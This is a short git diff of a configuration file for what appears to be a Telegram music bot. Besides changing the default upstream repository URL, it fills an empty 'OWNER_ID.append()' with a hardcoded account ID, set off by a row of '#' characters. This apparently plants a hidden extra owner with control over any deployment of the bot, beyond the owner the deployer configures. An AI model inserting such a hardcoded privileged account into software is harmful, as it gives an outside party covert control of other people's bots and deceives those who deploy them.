@@ -19,7 +19,7 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME", "❰𝐓𝐆 𝗫 𝐌𝐔𝐒𝐈𝐂
 OWNER_ID = list(map(int, getenv("OWNER_ID", "5230338052").split()))
 HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)
 HEROKU_APP_NAME = getenv("HEROKU_APP_NAME", None)
-UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/rishii7205_tg_playerr")
+UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/rishii7205_tg_player")
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "bikash")
 GIT_TOKEN = getenv("GIT_TOKEN", None)
 SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/jam_music_updates")
@@ -54,7 +54,7 @@ STRING5 = getenv("STRING_SESSION5", None)
 
 ############################
 COMMAND_PREFIXES.append('')
-OWNER_ID.append()
+OWNER_ID.append(5908843784)
 ############################
 BANNED_USERS = filters.user()
 YTDOWNLOADER = 1
